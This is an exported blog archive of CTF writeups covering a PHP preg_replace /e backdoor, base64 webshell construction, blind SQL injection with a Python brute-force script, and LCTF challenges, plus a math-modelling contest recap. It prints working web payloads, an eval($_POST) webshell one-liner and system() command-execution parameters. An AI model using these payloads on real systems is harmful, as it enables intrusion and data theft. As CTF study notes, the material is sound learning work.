{"meta":{"title":"Merl1ng's blog","subtitle":null,"description":"Love life , love gakki !","author":"Merl1ng","url":"http://Merl1ng.com"},"pages":[{"title":"categories","date":"2017-07-22T09:54:25.000Z","updated":"2017-07-22T09:54:50.915Z","comments":true,"path":"categories/index.html","permalink":"http://Merl1ng.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2017-07-22T09:35:23.000Z","updated":"2017-07-22T09:51:19.089Z","comments":true,"path":"tags/index.html","permalink":"http://Merl1ng.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"preg_replace后门","slug":"preg_replace后门","date":"2018-01-20T14:31:32.000Z","updated":"2018-01-27T07:27:18.573Z","comments":true,"path":"2018/01/20/preg_replace后门/","link":"","permalink":"http://Merl1ng.com/2018/01/20/preg_replace后门/","excerpt":"php中preg_replace用来正则替换所有符合条件的字符串 最近在看正则 刚好记录下","text":"php中preg_replace用来正则替换所有符合条件的字符串 最近在看正则 刚好记录下 题目题目是XCTF的一道新题 题目连接 http://47.104.74.209:20005/index.php?page=index 首先想到文件包含http://47.104.74.209:20005/index.php?page=php://filter/read=convert.base64-encode/resource=index.php 读到源码 其中第121行 12345678910111213141516&lt;?php//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123; echo \"&lt;br &gt;Welcome My Admin ! &lt;br &gt;\"; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt; 发现是 preg_replace 后门 preg_replace函数先了解一下这个函数 preg_replace（）是 php里面的正则函数 用来正则替换所有符合条件的字符串 最近在学python爬虫时学习了点正则表达式 改脚本时遇到了个replace函数 如xxx.replace(‘?’,’’)会把指定文本中的?替 换为空 但是这个好像不是正则表达式 只是单纯的替换 python中类似的还有参考http://blog.csdn.net/zcmlimi/article/details/47709049 回到php的preg_replace函数中来 PHP preg_replace() 正则替换，与Javascript 正则替换不同，PHP preg_replace() 默认就是替换所有符号匹配条件的元素 preg_replace函数原型 Preg_replace(mixed $pattern, mixed $replacement, mixed $subject [,int $limit = -1 [,int $count ]]) 有五个参数,有三个是必须参数 $pattern 可以是字符串,字符串数组,或者preg $replace 是用于替换的字符串或字符串数组 $subject 目标字符串或者目标字符串数组 $limit 每个模式在每个$subject上最大的替换次数,默认是-1(无限次) $count 返回在目标字符串所替换的次数 大概表示在 subject 中搜索 pattern 模式的匹配项并替换为 replacement 默认替换所有符号匹配条件的元素 举个例子 如 123$string='[b]粗体字[/b]';$b_rst=preg_replace('/\\[b\\](.*)\\[\\/b\\&#125;/i','&lt;b&gt;$1&lt;/b&gt;',$string);echo $b_rst; /i 表示不区分大小写 第二个参数中的（$n）：匹配的是第一个参数中的第n个括号中的内容 (.*)表示匹配任意一个长度大于等于0的字符串,这里匹配,[b]之间的汉字. 点表示任意字符,*表示字符长度大于等于0 用()括起来表示匹配到的字符串可以作为一个变量被其他表达式使用,第一个()里面的内容就是变量1,被其他表达式引用的时候用$1代表 如果正则表达式里面有第二个(),那么第二个()匹配到的内容就可以用$2被其他表达式引用,以此类推 [和/和]是正则表达式内部要用到的符号,所以在匹配[和]的时候要用[和\\/和]来转义 所以[b]就匹配[b] 1所以'/\\[b\\](.*)\\[\\/b\\&#125;/i','&lt;b&gt;$1&lt;/b&gt;'就是把[b]粗体字[/b]替换成&lt;b&gt;粗体字&lt;/b&gt; 其他的一些可以参考https://www.cnblogs.com/chenshishuo/p/4912456.htmlhttp://www.jb51.net/article/46458.htm preg_replace危险的/e修饰符(一句话后门常用)先看下 PHP 正则表达式修饰符 修饰符被放在PHP正则表达式定界符“/”尾部，在正则表达式尾部引号之前。 i 忽略大小写，匹配不考虑大小写m 多行独立匹配，如果字符串不包含[\\n]等换行符就和普通正则一样。s 设置正则符号 . 可以匹配换行符[\\n]，如果没有设置，正则符号.不能匹配换行符\\n。x 忽略没有转义的空格e eval() 对匹配后的元素执行函数。A 前置锚定，约束匹配仅从目标字符串开始搜索D 锁定$作为结尾，如果没有D，如果字符串包含[\\n]等换行符，$依旧依旧匹配换行符。如果设置了修饰符m，修饰符D 就会被忽略。S 对非锚定的匹配进行分析U 非贪婪，如果在正则字符量词后加“?”，就可以恢复贪婪X 打开与perl 不兼容附件u 强制字符串为UTF-8编码，一般在非UTF-8编码的文档中才需要这个 我们知道eval函数在php内经常被用来执行一句话木马 被认为是十分不安全的 如 1&lt;?php @eval($_POST['c']);?&gt; 即 /e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后） 提示:要确保replacement 构成一个合法的 PHP 代码字符串,否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误 如我们构造 123&lt;? echo preg_replace(\"/test/e\",$_GET[\"h\"],\"jutst test\"); ?&gt; 如果我们提交?h=phpinfo()，phpinfo()将会被执行（使用/e修饰符，preg_replace会将 replacement 参数当作 PHP 代码执行） 如果提交的是?h=eval(chr(102).chr(112).chr(117).chr(116).chr(115).chr(40).chr(102).chr(111).chr(112).chr(101).chr(110).chr(40).chr(39) .chr(100).chr(97).chr(116).chr(97).chr(47).chr(97).chr(46).chr(112).chr(104).chr(112).chr(39).chr(44).chr(39).chr(119).chr(39) .chr(41).chr(44).chr(39).chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36) .chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(99).chr(109).chr(100).chr(93).chr(41).chr(63).chr(62).chr(39).chr(41).chr(59)) 对应的明文是：?h=fputs(fopen(data/a.php,w),&lt;?php eval($_POST[cmd])?&gt;); 执行的结果是在/data/目录下生成一个一句话木马文件 a.php。 (Chr，返回以数值表达式值为编码的字符 (ASCII码)) 还有更加有难度的例子参考http://www.jb51.net/article/38714.htm 题目利用调用方法： preg_replace(“/test/e”,phpinfo(),”jutst test”); 所以下面构造payload，需要注意的是 $_SERVER[‘HTTP_X_FORWARDED_FOR’] === ‘127.0.0.1’ 我们需要改xff为127.0.0.1才能触发后门 pat=/test/e&amp;rep=phpinfo()&amp;sub=jutst%20test (rep=system(‘ls’)也可以) 发现一个可疑文件夹s3chahahaDir 通过改变参数执行命令 rep=system(‘ls+s3chahahaDir’) 发现flag文件夹 好像 cd s3chahahaDir &amp;&amp; ls 也可以 rep=system(‘ls+s3chahahaDir/flag’) 继续发现flag.php 最后 rep=system(‘cat+s3chahahaDir/flag/flag.php’) 读到flag","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"php","slug":"php","permalink":"http://Merl1ng.com/tags/php/"}]},{"title":"base64-webshell","slug":"base64-webshell","date":"2017-12-25T14:30:10.000Z","updated":"2017-12-27T15:22:31.365Z","comments":true,"path":"2017/12/25/base64-webshell/","link":"","permalink":"http://Merl1ng.com/2017/12/25/base64-webshell/","excerpt":"题目来源于XDCTF的一道web","text":"题目来源于XDCTF的一道web 首先题目存在文件包含漏洞 可以通过 php://filter/convert.base64-encode/resource=index.php 读取到目标服务器源码 发现 upload.php 的上传的规则 将上传的文件中非 acgtACGT 的所有字符替换为空然后再保存 那么也就是说我们上传的文件中只能允许 acgtACGT 这四个字符通过 即要用这八个字符构造webshell 这就要利用base64的一些特性来实现 base 64 特性任何由 {A-Z|a-z|0-9|+|/} 组合的字符串（如果不够4的倍数可以用’=’补全），如果长度为4的倍数 则都可以作为base64解码的材料，而在base64decode的时候，会产生原字符串包含字符集以外的字符 如 字符串aaaa进行base64解码： 结果为i�� 有一部分为乱码 但是至少产生了一个额外的、可以被利用的字符i base64编码是一种基于64个可打印字符来表示二进制数据的表示方法。由于2的6次方等于64，所以每6个比特为一个单元 对应某个可打印字符。三个字节有24个比特，对应于4个Base64单元，即3个字节可表示4个可打印字符。 也就是说3个字节进行base64编码之后是4个字节 四个字节解码后为三个字节。 因此base64有一个特性，就是以四位为一个单位，多个单位组合起来，进行多次解密，得到的结果和组合的顺序相同 123456789的编码结果为MTIzNDU2Nzg5，我们把加密后的字符串四个为一组拆开MTIz（123）、NDU2（456）、Nzg5（789） 组合为Nzg5NDU2MTIz 得到 789456123 base64还有一个特性，就是会自动抛弃不符合要求的字符，如果要进行解密的base64字符串包括有不合法的字符 也就是不在集合 {A-Z|a-z|0-9|+|/} 里，同时也不是末尾的等号的字符会被自动抛弃 aaaa的解密结果为i�� iiii的解密结果为�(� 如果我们把aaaa的解密结果重复四遍，再进行解密 结果和iiii的解密结果是一样的 所以我们可以得出 ① 编码和解码不是唯一对应，就是说字母a可能通过不同的，其它字符的组合进行base64解码解出来。（组合种类远多于base64的合法字符种类） ② 被解码的字符，以四位为一个单位，多个单位组合起来，进行多次解密，得到的结果和组合的顺序相同。 ③ 我们的一句话&lt;?php @eval($_POST[a]);?&gt;，可以通过解密另一个字符串，我们假设为字符串一号获得 而字符串一号可以通过解密字符串二号获得，并且这种序列不是唯一的。 我们有可能找到仅仅由acgtACGT这8个字符组合起来的一串字符 这串字符在经过n次解密后的结果为我们的一句话木马 当然，在这个过程中要保证四位一组，否则会乱序 webshell这里直接贴上一航大佬的代码和脚本 https://gist.github.com/WangYihang/144d39888a05ba307d6356c9e9fc80c6 https://gist.github.com/WangYihang/a49c663237e68822dd4816e99534ca72 演示视频https://asciinema.org/a/140670","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"base64","slug":"base64","permalink":"http://Merl1ng.com/tags/base64/"}]},{"title":"小美赛总结","slug":"小美赛总结","date":"2017-12-06T05:17:36.000Z","updated":"2017-12-28T14:31:17.265Z","comments":true,"path":"2017/12/06/小美赛总结/","link":"","permalink":"http://Merl1ng.com/2017/12/06/小美赛总结/","excerpt":"第一次参赛，啥都不会没弃赛感觉还可以XD","text":"第一次参赛，啥都不会没弃赛感觉还可以XD 最后结束时凌乱的桌面 赛题回顾原题都是英文 这里贴翻译过后的题目 问题A(MCM):飓风和全球变暖飓风(也包括在西北太平洋地区被称为台风的风暴和印度洋和西南太平洋的热带气旋)是极具破坏性的，常常导致数百人死亡，有时甚至数千人死亡。许多气象学家一致认为，在过去几十年里，全球变暖已经发生在地球表面(约半摄氏度)，而且这种趋势很可能会持续下去。问题是，全球变暖对飓风活动意味着什么?请构建一个合理的模型，测量全球变暖的程度和全球飓风活动的强度，并估计它们之间的关系。 问题B(MCM):电子邮件笔迹分析笔迹分析是一种非常特殊的调查形式，用于将人们与书面证据联系起来。笔迹调查人员通常被要求在法庭或刑事调查中，以确定书面样本是否来自某个特定的人。由于许多语言证据现在都出现在电子邮件中，从广义上说，笔迹分析也包括了如何通过电子邮件的语言特征来识别作者的问题。作者身份归属是指语言学家通过使用可识别的语言风格特征识别出有争议的文本的作者(s)的过程，从词频到更喜欢的句法结构。电子邮件的内容往往很短，作者的语言风格也很明显。请构建一个有效的模型，通过捕获电子邮件的语言特征来识别作者。你可以使用安然邮件数据集来训练和测试你的模型。安然公司电子邮件数据集链接:http://bailando.sims.berkeley.edu/enron_Email.html 问题C(ICM):如何打击人口贩运7月30日是联合国世界反人口贩运日，这一天的重点是结束对儿童、妇女和男性的强制劳动或性劳动的刑事剥削。全世界有27到458万的人被困在某种形式的现代奴役中。受害者被迫成为性工作者、乞丐和儿童兵，或在制造业、建筑、采矿、商业捕鱼等行业的家政工人、工厂工人和劳工。人口贩运发生在世界上的每个国家，包括美国，这是一个利润丰厚的行业，每年非法盈利的年产值估计高达1500亿美元。事实上，它是全球有组织犯罪的最大利润来源之一，仅次于非法毒品。世界上几乎每一个国家都受到人口贩运的影响，作为起点、中转或目的地，据报道，至少有127个国家的受害者在137个国家被剥削。人口贩卖是欧洲最赚钱的非法生意之一，犯罪集团每年从它那里赚了30亿美元，这使它成为一个相当大的犯罪集团，它是世界上最边缘化的人。在欧洲，超过14万的受害者被困在性剥削的暴力和堕落的环境中，多达七分之一的性工作者可能通过贩卖卖淫被奴役。在全球范围内，人口贩卖的受害者中有五分之一是儿童，尽管在非洲和大湄公河等贫穷地区和地区，他们占了大多数人口贩卖的人口。与此同时，妇女占世界人口贩运受害者的三分之二。从本质上讲，人口贩卖是一个供应链。捐助者(维克-1 tims)通过人口贩卖网络满足了需求(廉价和脆弱的非法劳动)。尽管他们努力在电网和阴影下运行，但他们还是留下了一条数据线索，不管这些数据是多么的微弱或支离破碎。数据分析的数学搜索，可以帮助执法部门打击人口贩卖。假设您的ICM团队受雇于UNODC，通过建立数学模型来打击人口贩卖。您的ICM团队的任务是:1。发现危险人群。贩卖人口往往以欺诈的方式开始，比如雇佣或浪漫的承诺。数据可以帮助确定特定的经济萧条地区，在那里我们可以确定最危险的人群，以及针对这些人群的预防活动。被卷入人口贩运的风险因素包括贫困、失业、移民和逃避政治冲突或战争。2。受害者身份和位置。人口贩运网络是动态的。贩毒者很可能会频繁地改变分布和运输路线，以避免被发现，这使得执法人员和分析人员在试图识别和摧毁人口贩卖网络的过程中，信息不完整。然而，研究人员可以通过跟踪不同位置的数据的细微趋势来帮助他们;在接触点，我们和受害者接触，比如急诊室;以及当地执法部门的活动。例如，在性交易中，可以通过从零售商店购买交易数据来寻找线索。受害者有时会偷取一些人贩子可能无法提供的基本用品，比如女性卫生用品、肥皂和牙膏。我们可以从小偷小偷中得到一些线索。使用现金进行交易的趋势，通常是用借记卡或信用卡来预订的，这也可能会增加一个危险信号。特别是性交易活动，在互联网的公共区域留下痕迹，主要是广告和陪护广告。广告商倾向于使用社交网络和交友网站，而更精通的人贩子经常会改变他们的网络存在，以躲避身份识别。通过数据挖掘，研究人员可以根据用户行为在不同的社交网络上定位用户，即使他们的用户名和信息不一样。建立网络信息之间的联系可以帮助我们锁定贸易商的地位。人们还知道，贩毒者利用在大型活动中对商业性剥削的需求增加，包括大会和大型体育赛事。分析了在线广告的位置和时间，可以帮助执法人员发现并可能阻断受害者的交通。3。网络中断。阻断人口流动、资金和其他人口贩运的要素对识别人口贩运网络至关重要，破坏他们在源头的基础设施并消除他们。不幸的是，网络中断需要有关当局和公众的合作。在一些国家，如尼泊尔和哥斯达黎加，官员们受到威胁或贿赂，以忽视或允许人类的“背叛”。对于使用被贩卖的劳工的行业，监管往往不够完善。贩毒者可以很容易地制造或修改受害者的身份证件，使他们无法看到负担过重的当局。为了帮助当局确定人口贩运的目标，研究人员可以求助于网络分析，这是一种描述真实世界系统及其相互作用的数学方法。例如，网络分析被用来描绘用户的动态，以及他们在社交网络中嵌入的连接，比如Facebook和Twitter。这可能会识别风险人群，或者，也可能是贩毒者或顾客。社交网络分析还可以帮助确定哪些联系人对其他人有重要影响。这可能使早期识别受害者或交易交易。 References[1] http://www.unodc.org/unodc/human-trafficking/[2] http://humantraffickinghotline.org/[3] https://www.fbi.gov/wanted/human-trafficking/[4] https://www.solidaritycenter.org/what-we-do/migration-andhuman-trafficking/ 选题第一次参赛选题蛮纠结的，一开始看出B题是机器学习首先排除了，在A与C之间选择。C题虽然贼长但是抱着题目越长 题越简单的心态还是认真读了好久，结果。。还是看不懂，所以排除法告诉我们选A 主要数据处理方法小波分析 – 找周期给定一组时间序列 分析出周期变化规律 主要由matlab自带的小波分析工具实现 最终利用suffer绘制 小波系数实部等值线图 小波系数模等值线图 小波系数模方等值线图 小波方差图 主周期趋图 相关教程http://blog.sciencenet.cn/blog-1148346-794768.htmlhttps://wenku.baidu.com/view/8d32e32058fb770bf78a5585.htmlhttps://wenku.baidu.com/view/bec1ebc90c22590102029dce.html 高斯分布 – 异常点检测找出数据中的异常值 并比对飓风强度和全球变暖程度出现的异常值时间是否接近 加了个机器学习 假装高大上一点XD 相关教程http://blog.csdn.net/u013719780/article/details/53219997http://blog.csdn.net/sinat_26917383/article/details/76647272 线性回归 – 拟合数据这个是最后处理飓风强度和全球变暖程度的关系 其实有很多回归方法 但是由于之前都没学过加上时间比较紧张 就选择了这个最简单的线性回归 最后提交之前我换了种回归拟合了一下数据 发现比线性的拟合程度好多了 但是没时间改了蛮可惜的 不过这个同样为显得不那么low 也结合了一下大热的机器学习 相关教程http://blog.csdn.net/july_sun/article/details/53223962http://blog.csdn.net/ivy_reny/article/details/78599523","categories":[],"tags":[]},{"title":"MCTF后两期writeup","slug":"MCTF后两期writeup","date":"2017-11-24T15:39:28.000Z","updated":"2017-12-22T14:00:27.182Z","comments":true,"path":"2017/11/24/MCTF后两期writeup/","link":"","permalink":"http://Merl1ng.com/2017/11/24/MCTF后两期writeup/","excerpt":"MCTF一共三期 后两期的题目还是比较有趣的","text":"MCTF一共三期 后两期的题目还是比较有趣的 第二期misc 1社工题目 给了一个docx的简历介绍了个人信息 搜那个视频得到主机公网地址和用户名 这个视频一开始搜错了 有个名字很像的 直接进腾讯视频里搜比较好 ssh连接要求输入密码 一开始还以为是弱口令 其实是那张图片 识图一下得到名字 就是服务器密码 进入后 ls cat查看 尝试登陆发现密码不对 进入空间得到信息 改了qq密码 吐槽qq邮箱垃圾 发现一个163邮箱 需要往这个163邮箱发送邮件 收到自动回复的flag web 1 SQL注入前传进入时提示 no username 第一题直接万能密码 1’ or ‘1’=’1’;# web 2 SQL注入正传同样提示 No username 随便输入一些东西 如果被过滤则会提示 ”hacker?” 但是会发现 注入的当前表没有数据，所以无论怎么闭合都是 username error 比如尝试 123456username = admin'#username = admin' or 1=1#username = admin') or 1=1#username = admin or 1=1#username = admin\" or 1=1#username = admin\") or 1=1# 会发现都没有过滤 一直是username error 意味着用户表没有数据。。 容易想到其后台语句: 1select * from users where username='$username' and password='$password' 既然没有数据 可以用union select填充 例如: 12username = admin' union select 1,2password = 1 这样原来的语句变成 1select * from users where username='admin' union select 1,2` 但是这个时候出现了password error 代表这个后台sql应该不是这样写的，当这样的时候就没有回显 12username = admin' union select 1,2password = 2 后台应该是这样的 1234567891011$sql = \"select * from users where username = '$username'\";$result = mysql_fetch_row($result);if(!$result)&#123;echo 'username error';&#125;$password_now = $result[1];if($password!=$password_now)&#123;echo 'password error';&#125; 那么这样 12345678username = admin' union select 1,1password = 1当时数据情况+----------+----------+| username | password |+----------+----------+| 1 | 1 |+----------+----------+ 是可以成功的，因为password查出来的确是1,此时回显是0 所以可以利用ascii比较是否为true，为true时，password列填充为1 123456mysql&gt; select * from users where username=-1 union select 1,2,(ascii(substr(database(),1,1))&gt;-1);+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | 2 | 1 |+----+----------+----------+ payload 12username = admin' union select 2,(ascii(substr((select flag from flag),1,1))=1)#password = 1 如果没有回显则是正确，有回显则是错误 还有一点就是union select的过滤 因为发现union没有过滤select也没有过滤 所以猜想他的过滤是这样写的……|union select|…… 所以可以利用他的过滤不充分而得到绕过union%0bselect 解密脚本12345678910111213141516171819#!/usr/bin/env python# coding:utf-8import urllibimport requestsflag=\"\"url = \"http://114.67.224.31:32769/index.php\"for i in range(1,100): for j in range(33,127): payload = \"123' Union%%0bSeleCt 2,(ascii(substr((select flag from flag),%s,1))=%s)#\"%(i,j) payload = urllib.unquote(payload) data = &#123; \"username\":payload, \"password\":\"1\" &#125; r= requests.post(url=url,data=data) if \"error\" not in r.content: flag +=chr(j) print flag break 第三期misc 1图片隐写 感觉到图片下部没显示完整 更改图片大小 把后一个改成 05 09 即增大图片长度 这种类型的题目之前也遇到过","categories":[{"name":"writeup","slug":"writeup","permalink":"http://Merl1ng.com/categories/writeup/"}],"tags":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/tags/web/"},{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/tags/misc/"}]},{"title":"Lctf整理","slug":"Lctf整理","date":"2017-11-20T14:51:59.000Z","updated":"2017-12-24T14:57:31.142Z","comments":true,"path":"2017/11/20/Lctf整理/","link":"","permalink":"http://Merl1ng.com/2017/11/20/Lctf整理/","excerpt":"被虐地泣不成声 伏地膜大佬","text":"被虐地泣不成声 伏地膜大佬 没有一道完全做完了 只敢贴dalao们的题解 补充一下要学习的地方 web 1 Simple blog目前理解思路 扫目录拿源码 弱口令+cbc攻击绕过后台登陆 进入后台sql注入 出题人writeuphttps://github.com/LCTF/LCTF2017/blob/master/src/web/simple-blog/web-f1sh-writeup.md 进入题目后可以知道这是一个博客系统，那猜测应该会有后台，扫一下目录或者猜一下可以知道存在login.php, admin.php两个文件，访问admin.php可以发现有权限控制，访问login.php是一个登录界面。 通过尝试可以发现如果随便输入账号密码的话页面返回是Login failed.，但是账号密码都输入admin的话会跳转 到admin.php，猜测这里应该是弱口令，只是除了密码以外还有其他的验证方式。 如果扫描字典够强大的话可以扫到login.php, admin.php都存在备份文件：.login.php.swp, .admin.php.swp 这里需要不断完善字典 之前加了个index.php~ 还有 bak的泄露 CBC翻转字节攻击http://f1sh.site/2017/08/04/%E5%88%9D%E5%AD%A6padding-oracle-attack/ 这个之前见了好多次了 一直没去看 sql注入 PHP格式化字符串的漏洞 sql和php依然是基础https://paper.seebug.org/386/ 注入时也有一个小坑，key这个表名是MYSQL保留字，我们把它当做表名带入查询时必须用反引号包起来，不然就会报语法错误而返回不了我们想要的结果。 web 2 萌萌哒报名系统目前理解思路 常见编辑器特点找源码 pre_match绕过登陆 登陆后php伪协议base64读源码 出题人writeuphttps://github.com/LCTF/LCTF2017/tree/master/src/web/%E8%90%8C%E8%90%8C%E5%93%92%E7%9A%84%E6%8A%A5%E5%90%8D%E7%B3%BB%E7%BB%9F .idea php编辑器找源码这题提示给了IDE，那么我们可以想到PHP有款强大的IDE叫做PHPSTORM，他新建项目的时候会生成一个.idea文 件夹，访问发现有一个workspace.xml文件，访问里面发现了一个xdcms2333.zip。 下载可得到整站源码 register.php pre_match函数的资源消耗pre_match在匹配的时候会消耗较大的资源，并且默认存在贪婪匹配，所以通过喂一个超长的字符串去给pre_match 吃，导致pre_match消耗大量资源从而导致php超时，后面的php语句就不会执行。 复现了一下 注册窗口代理抓包 输入一堆贼长的 使其没有返回 (一开始抓的是登陆窗口gg了好久) 同时关掉代理 在另外一个窗口用注册的账号登陆 成功进入 member.php 然后利用伪协议在member.php下读取config.php源码 base64解密 条件竞争（非预期解法）web 3 假的签到题…签不了555 出题人writeuphttps://github.com/LCTF/LCTF2017/blob/master/src/web/%E7%AD%BE%E5%88%B0%E9%A2%98/web%E7%AD%BE%E5%88%B0%E9%A2%98.md 提示读取本地文件 用file协议读取本地文件绕过逻辑中对host的检查, curl是支持file://host/path,file://path这两种形式, 但是即使有host, curl仍然会访问到本地的文件 截断url后面拼接的/, GET请求, 用?#都可以payload : file://www.baidu.com/etc/flag? 一脸懵逼 web 4 L PLAYGROUND 出题人的writeup https://github.com/LCTF/LCTF2017/blob/master/src/web/l-plarground/writeup.md 这题还没看懂 nu1l的writeup http://www.venenof.com/index.php/archives/515/ ssrfweb 5 “他们”有什么秘密呢? 第一部分sql注入，第二部分文件上传(限制七字符长度)+命令执行 web 6 wanna hack him? dangling markup attack&lt;meta&gt;标签来Set-Cookiexss拿到 nonce 后 xss","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/tags/web/"},{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/tags/misc/"}]},{"title":"MCTFwriteup","slug":"MCTFwriteup","date":"2017-11-13T14:22:50.000Z","updated":"2017-12-25T14:50:25.054Z","comments":true,"path":"2017/11/13/MCTFwriteup/","link":"","permalink":"http://Merl1ng.com/2017/11/13/MCTFwriteup/","excerpt":"浙警的ctf 第一期还是比较友好的","text":"浙警的ctf 第一期还是比较友好的 crypto 1一共四道密码的 就一道学到了一点 一串字符凯撒解密后 但是提示数字也要移位 所以 将2改成0 当然用python脚本ascii全移位就行了 misc 1lsb密码+已知明文攻击 题目给了无后缀的 hint 和一张图片 hint为docx文档 里面打开虽然是显示 wwwwww 但是你发现回车在后面 改变字体颜色 看到 wwwwww大概在这里 key.jpg藏在hint再改为zip解压后的某一文件夹下 所以总体思路 图片lsb勾选三个最低位 拿到zip 解压发现需要密码 里面除了flag文件还有 key.jpg 联想已知明文攻击 去 hint找 改docx 看到提示 (好吧感觉也不是什么提示) 再把hint改zip解压winhex看文件头 找到一个jpg的 以同样方式压缩 然后已知明文攻击 但是这里需要先winrar修复一下那个压缩包 不然不行 misc 2zip伪加密+盲水印 伪加密在很后面的位置 顺带一提遇到过压缩包里三个文件全是伪加密的 则三个都要改 可以直接用 ZipCenOp 修复伪加密 解压后拿到图片 但是盲水印需要原图 猜测给的图里还有东西 binwalk拿到原图 运行这个需要cv2库 下载 openvc 将opencv\\build\\python\\2.7\\x86中的cv2.pyd (我是64位的)复制到python安装目录Lib\\site-packages下 但是尼玛还不行 根据提示再安装两个库 我是直接 pip install 的 web 1基础复习 firefox里添加X-FORWAEDRD-FOR:110.110.110.110 然后修改useragent为iphone X 修改Accept-Language为：zh-CN 修改host:127.0.0.1得到flag web 2 忘记密码登陆框 看title MD5猜测0e开头的md5 username=240610708 passward=QLTHNDT web 3 php best!!!登陆框 看title secure hash algorithm(哈希算法) 数组绕过 name[]=123 pass[]=123 php的sha1函数漏洞 以前写的文章里有 web 4 PHP加密网页里fTdydHtWOV9gaG5VXDJqPHcxPFxhbHRVfDdpPUV5TlxdQ2hpVWA= 明显base64，但解密后发现没规律 发现是源码泄露 在 index.php~ 里看到源码 可以看到这个代码里，先对初始的flag进行了字符串的倒置以及rot12加密。 接下来按位操作，每一位的值为 key的ascii码 乘于位数。然后当相加后的值超过125这个最大可见ascii的时候，对该位的值进行-78的操作。 之后又进行了一个二位栅栏加密的操作，最后base64加密输出。 解题思路：由于key未知，所以在这里我们需要对key进行一个爆破 先进行base64解密，然后解密栅栏。 然后对可见字符串的key进行一个暴力猜解，最后能够在输出的一堆乱码中找到我们需要的flag php脚本 12345678910111213141516171819202122232425262728293031&lt;?php$flag = 'flag&#123;********************************&#125;';$len = strlen($flag);$base = 'fTdydHtWOV9gaG5VXDJqPHcxPFxhbHRVfDdpPUV5TlxdQ2hpVWA=';$base = base64_decode($base);$s = \"\";for($i=0;$i&lt;(strlen($flag)/2);$i++)&#123; $s = $s.$base[$i].$base[$i+19];&#125;for($key=48;$key&lt;126;$key++)&#123; for($i=0;$i&lt;strlen($flag);$i++) &#123; $str[$i] = substr($s,$i,1); $str[$i] = ord($str[$i])-$key*$i; while($str[$i]&lt;48) &#123; $str[$i] = $str[$i]+78; &#125; &#125; $out = \"\"; for($i=0;$i&lt;strlen($flag);$i++) &#123; $out = $out.chr($str[$i]); &#125; echo strrev($out); echo '&lt;/br&gt;';&#125;?&gt; web 5 BurpLoader爆破 不需要payload 模拟点击即可 clear $ web 6%00截断 以前也记录过 先根据提示的机器人 进入 robots.txt 看到源码 123456789101112131415161718192021222324252627&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=gbk\"&gt;&lt;title&gt;听说猫喜欢机器人&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;img src=\"./aabbcc.jpg\"&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php$flag='********';if (isset ($_GET['cat'])) &#123; if (ereg (\"^[0-9b-f]+$\", $_GET['cat']) === FALSE) echo '喵喵好像特别喜欢小写字母和数字'; else if ($_GET['cat']==0) &#123; if(strpos ($_GET['cat'], 'miaomiao') !==FALSE) &#123; die('Flag: '.$flag); &#125; else &#123; echo '&lt;p&gt;好像必须要喵喵呢&lt;/p&gt;';&#125; &#125; else&#123;echo '&lt;p&gt;喵喵迷路了&lt;/p&gt;';&#125; &#125;?&gt; %00绕过 ereg的正则表达式检查 而strpos不受影响","categories":[{"name":"writeup","slug":"writeup","permalink":"http://Merl1ng.com/categories/writeup/"}],"tags":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/tags/web/"},{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/tags/misc/"}]},{"title":"swpu2017writeup","slug":"swpu2017writeup","date":"2017-11-12T14:29:16.000Z","updated":"2017-11-17T03:59:50.499Z","comments":true,"path":"2017/11/12/swpu2017writeup/","link":"","permalink":"http://Merl1ng.com/2017/11/12/swpu2017writeup/","excerpt":"最近考试比较多 swpu的这个没怎么做 但是听dalao们说题目质量还是很不错的 在赛后学习一波","text":"最近考试比较多 swpu的这个没怎么做 但是听dalao们说题目质量还是很不错的 在赛后学习一波 misc 1java的小游戏 说是坚持60s秒不被打中就可以 可以直接走到地图外面(方向键控制) 等60s回来gg拿到flag 我是直接binwalk 然后把得到的文件用 notepad++打开搜索flag 好像也可以反编译看源码 misc 2给了一张图片 发现藏有zip包 提取并解压后得到 题目有提示 ???_???_??? 可知flag需要三个字符串 这些打开是一张张图片 对应gif的每一帧 emmm虽然gif提示排序但是把gif分解后会发现从小到大顺序都是排好的 所以要对每个文件逐个分析 在文件8的末尾找到第一个字符串flag 应该不是flag本身 文件88中直接有一个二维码，扫码得第二个字符串bilibili 文件888加上jpg的后缀 在属性 备注中发现一串base64，解码得第三个字符串silisili 文件8888用binwalk跑一下发现里面有一个zip，解压获得一个二维码，扫码得第四个字符串panama 按提示中的格式拼接即得flag misc 3mp3隐写 想到是使用mp3stego进行隐写，所以寻找key 题目提示 fl?g??? 又根据题目叙述搜索程序员的情人节 搜索到522 (16进制的1314) (那个脱口秀上也提过这个2333) 结合为 flag1314 当然也可以写脚本爆破 web 1点进链接是一个登录界面，右键查看源码有两条隐藏信息 12&lt;!--The #define is xxooaa and LEN is 6--&gt;&lt;!--The crypt key is &#123;11132, 468, 392, 1281, 62&#125;--&gt; 然后扫目录扫到了一个index.php.bak，下载下来打开后是乱码 也不是ph和chu师傅在小密圈里的phpjiami 主办方放出提示php-screw 这两篇文章 http://blog.csdn.net/water_cow/article/details/41872091 